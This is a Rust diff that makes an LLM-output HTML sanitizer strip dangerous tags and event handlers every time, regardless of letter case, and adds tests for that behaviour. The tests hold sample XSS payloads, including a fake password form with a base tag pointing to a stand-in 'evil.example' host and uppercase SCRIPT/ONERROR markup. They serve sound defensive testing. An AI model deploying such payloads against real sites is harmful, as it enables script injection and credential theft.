@@ -705,43 +705,50 @@ pub struct OutputSanitizationResult {
 
 pub fn sanitize_llm_output(raw: &str) -> OutputSanitizationResult {
     let mut violations = Vec::new();
-    let mut modified = false;
-    let mut output = raw.to_string();
 
     if let Some(m) = XSS_PATTERN_RE.find(raw) {
         violations.push(format!("XSS pattern detected: {}", m.as_str()));
-        modified = true;
     }
 
     if let Some(m) = CSS_INJECTION_RE.find(raw) {
         violations.push(format!("CSS injection pattern: {}", m.as_str()));
-        modified = true;
     }
 
     if let Some(m) = HTML_ENTITY_XSS_RE.find(raw) {
         violations.push(format!("HTML entity XSS: {}", m.as_str()));
-        modified = true;
     }
 
-    // Strip dangerous HTML tags and event handlers from output
-    if modified {
-        output = strip_dangerous_html_tags(raw);
-    }
+    // SM9 #2: the stripper runs UNCONDITIONALLY. The detectors above are a
+    // blocklist and now decide only violation REPORTING, never whether
+    // stripping happens — gating the stripper on detection meant any payload
+    // the detectors missed (e.g. `@import 'http://…'` without `url()`, or
+    // `<base>`/`<form>` tags only the stripper knows about) sailed through
+    // completely untouched, i.e. the stripping layer provided zero protection
+    // against exactly the novel shapes it exists for. On already-clean text
+    // the substitution pipeline is a no-op.
+    let output = strip_dangerous_html_tags(raw);
+    let was_modified = output != raw;
 
     OutputSanitizationResult {
         sanitized: output,
-        was_modified: modified,
+        was_modified,
         violations,
     }
 }
 
 fn strip_dangerous_html_tags(html: &str) -> String {
+    // SM9 #2 (verifier-repair): both strippers are ASCII-case-insensitive.
+    // `<SCRIPT>` and `ONERROR=` are the same markup as their lowercase forms;
+    // a case-folding blind spot here would let uppercase payloads through the
+    // UNCONDITIONAL stripper untouched (the exact "stripper adds zero
+    // protection" class this function exists to close — cf. the crate's own
+    // EMAIL_BODY_STRIP_PATTERNS fix for the same defect).
     static DANGEROUS_TAG_RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"</?(?:script|iframe|embed|object|applet|meta|link|base|form|input|button|select|textarea|style|svg|math)[^>]*>").expect("valid tag regex")
+        Regex::new(r"(?i)</?(?:script|iframe|embed|object|applet|meta|link|base|form|input|button|select|textarea|style|svg|math)[^>]*>").expect("valid tag regex")
     });
 
     static EVENT_HANDLER_RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r#"\s+on\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)"#)
+        Regex::new(r#"(?i)\s+on\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)"#)
             .expect("valid event handler regex")
     });
 
@@ -1129,6 +1136,55 @@ mod tests {
         let result =
             sanitize_llm_output("The Pro plan costs €65/month and includes 150,000 emails.");
         assert!(!result.was_modified);
+    }
+
+    /// SM9 #2: stripping is UNCONDITIONAL — it no longer waits for a
+    /// detector hit. `<form>`/`<input>`/`<base>` are outside the detector
+    /// vocabulary (XSS_PATTERN_RE lists neither), so under the old
+    /// detect-then-strip gate this payload sailed through untouched; now
+    /// the stripper runs regardless and `violations` staying empty must
+    /// not imply the output was trusted.
+    #[test]
+    fn sanitize_output_strips_even_when_no_detector_fires() {
+        let result = sanitize_llm_output(
+            r#"<form action="/steal"><input name="pw"><base href="http://evil.example/"></form>"#,
+        );
+        assert!(
+            result.was_modified,
+            "a payload the detectors miss must still be stripped: {}",
+            result.sanitized
+        );
+        assert!(
+            result.violations.is_empty(),
+            "this vector evades every detector — stripping is what caught it"
+        );
+        assert!(!result.sanitized.contains("<form"));
+        assert!(!result.sanitized.contains("<input"));
+        assert!(!result.sanitized.contains("<base"));
+        assert!(
+            !result.sanitized.contains("http://evil.example/"),
+            "the injection attribute must not survive: {}",
+            result.sanitized
+        );
+    }
+
+    /// SM9 #2 (verifier-repair): the unconditional stripper is
+    /// ASCII-case-insensitive — `<SCRIPT>` and `ONERROR=` are the same
+    /// markup as their lowercase forms and must not survive a case-folding
+    /// blind spot (the same defect class the EMAIL_BODY_STRIP_PATTERNS fix
+    /// closed for email bodies).
+    #[test]
+    fn sanitize_output_strips_case_folded_payloads() {
+        let result =
+            sanitize_llm_output("<SCRIPT>alert(1)</SCRIPT><img SRC=x ONERROR=alert(2)>");
+        assert!(
+            result.was_modified,
+            "uppercase markup must be stripped: {}",
+            result.sanitized
+        );
+        let lower = result.sanitized.to_ascii_lowercase();
+        assert!(!lower.contains("<script"), "{}", result.sanitized);
+        assert!(!lower.contains("onerror"), "{}", result.sanitized);
     }
 
     // ── Email Body Sanitization ──
